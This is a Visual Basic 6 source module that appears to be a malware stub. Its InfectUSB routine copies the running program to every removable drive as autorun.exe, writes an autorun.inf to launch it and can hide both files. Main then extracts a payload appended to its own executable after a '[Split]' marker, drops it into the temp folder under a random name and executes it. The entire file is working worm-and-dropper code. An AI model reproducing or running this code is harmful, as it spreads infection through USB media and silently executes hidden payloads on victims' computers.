Attribute VB_Name = "ModMain"

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hHandle As Long) As Long
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Const MAX_PATH = 260
Const DRIVE_REMOVABLE = 2
Const FILE_ATTRIBUTE_HIDDEN = 2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const OPEN_ALWAYS = 4
Const GENERIC_WRITE = &H40000000
Const FILE_SHARE_WRITE = &H2
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Private Type LARGE_INTEGER
    dwLow As Long
    dwHigh As Long
End Type

Public Function GetTemporyFolderPath() As String

    Dim bitch As String
    Dim PD As Long

    bitch = String(MAX_PATH, Chr(0))
    PD = GetTempPath(MAX_PATH, bitch)
    GetTemporyFolderPath = Left(bitch, PD)

End Function

Private Sub Main()
Dim server As String
Dim executable() As String
Dim Random As Integer
Dim wesh As String
Randomize
Random = Rnd * 100
hInfected = InfectUSB("autorun.exe", False)
wesh = GetTemporyFolderPath & "a" & Random & ".exe"

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
server = Space(LOF(1))
Get #1, , server
Close #1

executable = Split(server, "[Split]")

Open wesh For Binary As #1
Put #1, , executable(1)
Close #1

Shell wesh


End Sub


Private Function InfectUSB(Filename As String, Hide As Boolean) As Long
    Dim szBuffer As String * 128
    Dim Drive As Variant
    Dim Drives() As String
    hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer)
    If hGet <> 0 Then
        Drives = Split(szBuffer, Chr(0))
        For Each Drive In Drives
            If GetDriveType(Drive) = DRIVE_REMOVABLE Then
                If CopyToFile(GetFilename, Drive & Filename) = True Then
                    If WriteToFile(Drive & "autorun.inf", _
                        "[autorun]" & vbCrLf & "open=" & Drive & Filename) = True Then
                        If Hide = True Then
                            SetFileAttributes Drive & "autorun.inf", FILE_ATTRIBUTE_HIDDEN
                            SetFileAttributes Drive & Filename, FILE_ATTRIBUTE_HIDDEN
                        End If
                        InfectUSB = InfectUSB + 1
                    End If
                End If
            End If
        Next Drive
    End If
End Function

Private Function GetFilename() As String
    Dim szBuffer As String * 255
    GetModuleFileName 0, szBuffer, Len(szBuffer)
    GetFilename = szBuffer
End Function

Private Function CopyToFile(Filename As String, Newname As String) As Boolean
    hCopy = CopyFile(Filename, Newname, 0)
    If hCopy <> 0 Then
        CopyToFile = True 'success
    End If
End Function

Private Function WriteToFile(Filename As String, buffer As String) As Boolean
    hFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    If hFile <> 0 Then
        hWrite = WriteFile(hFile, buffer, Len(buffer), 0, 0)
        If hWrite <> 0 Then
            WriteToFile = True 'success
        End If
    End If
    CloseHandle (hFile)
End Function
